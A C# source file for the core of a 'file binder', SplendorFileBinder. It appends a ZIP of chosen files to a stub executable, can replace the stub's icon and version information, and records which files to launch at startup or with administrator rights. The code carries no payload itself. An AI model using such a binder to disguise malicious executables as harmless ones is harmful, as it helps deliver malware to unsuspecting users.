// ============================================================================
// BinderEngine.cs - Core binding logic
//
// Output layout:
//   [Stub.exe bytes][ZIP archive][8-byte ZIP offset][8-byte magic "SPLNDBND"]
//
// ZIP contains user files + __splendor_manifest.json with settings.
// ============================================================================

using System.IO.Compression;
using System.Text;
using System.Text.Json;

namespace SplendorFileBinder;

public static class BinderEngine
{
    private static readonly byte[] Magic = Encoding.ASCII.GetBytes("SPLNDBND");
    public const string ManifestName = "__splendor_manifest.json";

    public static void Bind(
        string stubExePath,
        IReadOnlyList<string> filesToBind,
        string outputExePath,
        string? iconPath = null,
        VersionInfoData? versionInfo = null,
        IReadOnlyList<string>? startupFiles = null,
        IReadOnlyList<string>? adminFiles = null,
        string extractLocation = "temp",
        Action<double>? progress = null)
    {
        if (!File.Exists(stubExePath))
            throw new FileNotFoundException($"Stub not found: {stubExePath}");
        if (filesToBind.Count == 0)
            throw new ArgumentException("No files to bind.");

        foreach (string f in filesToBind)
            if (!File.Exists(f)) throw new FileNotFoundException($"File not found: {f}");

        // --- Step 1: Prepare stub (icon + version info) ---
        bool hasIcon = !string.IsNullOrEmpty(iconPath) && File.Exists(iconPath);
        bool hasVer = versionInfo != null && versionInfo.HasAnyValue;
        byte[] stubBytes;

        if (hasIcon || hasVer)
        {
            string tmp = Path.Combine(Path.GetTempPath(), $"SplendorFileStub_{Guid.NewGuid():N}.exe");
            try
            {
                File.Copy(stubExePath, tmp, true);
                IconInjector.ModifyResources(tmp, iconPath, versionInfo);
                stubBytes = File.ReadAllBytes(tmp);
            }
            finally { try { File.Delete(tmp); } catch { } }
        }
        else
        {
            stubBytes = File.ReadAllBytes(stubExePath);
        }

        progress?.Invoke(0.15);

        // --- Step 2: Create ZIP ---
        byte[] zipBytes;
        using (var zipStream = new MemoryStream())
        {
            using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
            {
                var usedNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                for (int i = 0; i < filesToBind.Count; i++)
                {
                    string filePath = filesToBind[i];
                    string name = GetUniqueName(Path.GetFileName(filePath), usedNames);
                    usedNames.Add(name);

                    var entry = archive.CreateEntry(name, CompressionLevel.Optimal);
                    using var es = entry.Open();
                    using var fs = File.OpenRead(filePath);
                    fs.CopyTo(es);

                    progress?.Invoke(0.15 + 0.7 * ((double)(i + 1) / filesToBind.Count));
                }

                // Add manifest with settings
                var manifest = new
                {
                    extractLocation = extractLocation ?? "temp",
                    startupFiles = startupFiles ?? (IReadOnlyList<string>)Array.Empty<string>(),
                    adminFiles = adminFiles ?? (IReadOnlyList<string>)Array.Empty<string>()
                };
                var manifestEntry = archive.CreateEntry(ManifestName, CompressionLevel.Optimal);
                using var mw = new StreamWriter(manifestEntry.Open(), Encoding.UTF8);
                mw.Write(JsonSerializer.Serialize(manifest));
            }
            zipBytes = zipStream.ToArray();
        }

        // --- Step 3: Write output ---
        long zipOffset = stubBytes.Length;
        using (var output = File.Create(outputExePath))
        {
            output.Write(stubBytes);
            output.Write(zipBytes);
            output.Write(BitConverter.GetBytes(zipOffset));
            output.Write(Magic);
        }

        progress?.Invoke(1.0);
    }

    private static string GetUniqueName(string fileName, HashSet<string> used)
    {
        if (!used.Contains(fileName)) return fileName;
        string n = Path.GetFileNameWithoutExtension(fileName);
        string e = Path.GetExtension(fileName);
        int c = 2;
        while (used.Contains($"{n}_{c}{e}")) c++;
        return $"{n}_{c}{e}";
    }
}
